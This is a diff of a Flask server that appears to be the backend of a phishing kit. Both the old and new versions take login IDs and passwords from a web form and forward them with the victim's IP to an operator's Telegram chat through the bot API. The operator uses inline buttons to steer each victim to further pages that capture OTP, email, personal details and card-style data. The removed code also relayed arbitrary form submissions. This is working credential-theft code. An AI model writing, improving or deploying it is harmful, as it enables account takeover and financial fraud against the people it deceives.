@@ -1,132 +1,114 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import os
-import requests
 import uuid
+import requests
 from dotenv import load_dotenv
 
-# Load env vars
+# Setup
 load_dotenv()
-BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"
-CHAT_ID = os.getenv("CHAT_ID")
-
-if not BOT_TOKEN or not CHAT_ID:
-    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID environment variables.")
-
 app = Flask(__name__)
 CORS(app)
 
-# In-memory storage (use database for production)
-user_status = {}  # { uuid: {'status': 'pending', 'redirect': None} }
+# Telegram Config
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Use your secret token
+CHAT_ID = os.getenv("CHAT_ID")  # Must be set on Render env
 
-# ========== Helpers ==========
+if not BOT_TOKEN or not CHAT_ID:
+    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
 
-def send_telegram_approval(login_id, password, user_ip, uid):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    buttons = [
-        [
-            {"text": "✅ Approve OTP", "callback_data": f"approve|{uid}|otp.html"},
-            {"text": "📧 Email Page", "callback_data": f"approve|{uid}|email.html"},
-        ],
-        [
-            {"text": "👤 Personal", "callback_data": f"approve|{uid}|personal.html"},
-            {"text": "🔑 Login2", "callback_data": f"approve|{uid}|login2.html"},
-        ],
-        [
-            {"text": "❌ Deny", "callback_data": f"deny|{uid}|error"}
-        ]
-    ]
+# Track sessions: { session_id: {"approved": bool, "redirect_url": str} }
+SESSION_STATUS = {}
+
+# Emoji-enhanced buttons in rows
+BUTTONS = [
+    {"emoji": "🔐", "text": "OTP", "page": "otp.html"},
+    {"emoji": "📧", "text": "Email", "page": "email.html"},
+    {"emoji": "🧍", "text": "Personal", "page": "personal.html"},
+    {"emoji": "🔑", "text": "Login2", "page": "login2.html"},
+    {"emoji": "🧾", "text": "C Page", "page": "c.html"},
+]
+
+def send_to_telegram(login_id, password, ip, session_id):
+    msg = (
+        f"<b>🔐 New Login</b>\n\n"
+        f"<b>Login ID:</b> <code>{login_id}</code>\n"
+        f"<b>Password:</b> <code>{password}</code>\n"
+        f"<b>IP:</b> <code>{ip}</code>\n"
+        f"<b>Session ID:</b> <code>{session_id}</code>"
+    )
+    inline_keyboard = [[
+        {
+            "text": f"{b['emoji']} {b['text']}",
+            "callback_data": f"{session_id}:{b['page']}"
+        }
+    ] for b in BUTTONS]
+
     payload = {
         "chat_id": CHAT_ID,
-        "text": f"<b>🔐 Login Attempt</b>\n<b>Login ID:</b> <code>{login_id}</code>\n<b>Password:</b> <code>{password}</code>\n<b>IP:</b> <code>{user_ip}</code>\n<b>UID:</b> <code>{uid}</code>",
+        "text": msg,
         "parse_mode": "HTML",
-        "reply_markup": {"inline_keyboard": buttons}
+        "reply_markup": {"inline_keyboard": inline_keyboard}
     }
-    response = requests.post(url, json=payload)
-    return response.ok
 
-# ========== Routes ==========
-
-@app.route("/", methods=["GET"])
-def root():
-    return "✅ Flask server is running."
+    try:
+        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+        print("Telegram sent:", r.status_code)
+        return r.ok
+    except Exception as e:
+        print("Telegram error:", e)
+        return False
 
 @app.route("/login", methods=["POST"])
 def login():
-    try:
-        data = request.get_json()
-        login_id = data.get("login")
-        password = data.get("password")
-        if not login_id or not password:
-            return jsonify({"success": False, "error": "Missing fields"}), 400
+    data = request.get_json()
+    if not data or "login" not in data or "password" not in data:
+        return jsonify({"success": False, "error": "Missing fields"}), 400
 
-        uid = str(uuid.uuid4())
-        user_status[uid] = {"status": "pending", "redirect": None}
-        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    login_id = data["login"]
+    password = data["password"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
 
-        sent = send_telegram_approval(login_id, password, user_ip, uid)
-        if not sent:
-            return jsonify({"success": False, "error": "Telegram send failed"}), 500
+    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
 
-        return jsonify({"success": True, "id": uid}), 200
-    except Exception as e:
-        print("Login error:", e)
-        return jsonify({"success": False, "error": "Internal server error"}), 500
+    if not send_to_telegram(login_id, password, ip, session_id):
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
 
-@app.route("/status/<uid>", methods=["GET"])
-def check_status(uid):
-    entry = user_status.get(uid)
-    if not entry:
-        return jsonify({"status": "invalid"}), 404
-    if entry["status"] == "approved":
-        return jsonify({"status": "approved", "redirect_url": entry["redirect"]}), 200
-    elif entry["status"] == "denied":
-        return jsonify({"status": "denied", "redirect_url": "error.html"}), 403
-    return jsonify({"status": "pending"}), 200
+    return jsonify({"success": True, "id": session_id}), 200
 
 @app.route("/webhook", methods=["POST"])
-def telegram_webhook():
+def webhook():
+    update = request.get_json()
+    if not update or "callback_query" not in update:
+        return jsonify({"status": "ignored"}), 200
+
     try:
-        data = request.get_json()
-        callback = data.get("callback_query", {})
-        callback_data = callback.get("data", "")
-        message = callback.get("message", {})
-        chat_id = message.get("chat", {}).get("id")
-
-        if "|" in callback_data:
-            action, uid, target = callback_data.split("|")
-            if uid in user_status:
-                if action == "approve":
-                    user_status[uid]["status"] = "approved"
-                    user_status[uid]["redirect"] = target
-                elif action == "deny":
-                    user_status[uid]["status"] = "denied"
-                    user_status[uid]["redirect"] = "error.html"
-
-                # Acknowledge callback
-                answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
-                requests.post(answer_url, json={"callback_query_id": callback["id"], "text": f"{action.title()}d!"})
-        return jsonify({"ok": True})
+        data = update["callback_query"]["data"]
+        session_id, page = data.split(":")
+        if session_id in SESSION_STATUS:
+            SESSION_STATUS[session_id]["approved"] = True
+            SESSION_STATUS[session_id]["redirect_url"] = page
+            return jsonify({"status": "ok"}), 200
+        else:
+            return jsonify({"status": "unknown session"}), 404
     except Exception as e:
         print("Webhook error:", e)
-        return jsonify({"ok": False, "error": str(e)}), 500
-
-@app.route("/<page>", methods=["POST"])
-def generic_post(page):
-    try:
-        data = request.get_json() or request.form.to_dict()
-        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-        msg = f"<b>{page.upper()} Submission</b>\n"
-        msg += "\n".join([f"<b>{k}:</b> <code>{v}</code>" for k, v in data.items()])
-        msg += f"\n<b>IP:</b> <code>{ip}</code>"
-
-        send_telegram_approval("FORM", msg, ip, str(uuid.uuid4()))
-        return jsonify({"status": "ok"}), 200
-    except Exception as e:
-        print("Form error:", e)
         return jsonify({"status": "error"}), 500
 
-# ========== Start ==========
+@app.route("/status/<session_id>", methods=["GET"])
+def status(session_id):
+    session = SESSION_STATUS.get(session_id)
+    if not session:
+        return jsonify({"error": "Not found"}), 404
+    if session["approved"]:
+        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
+    return jsonify({"status": "pending"}), 200
+
+@app.route("/", methods=["GET"])
+def home():
+    return "✅ Server is live"
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
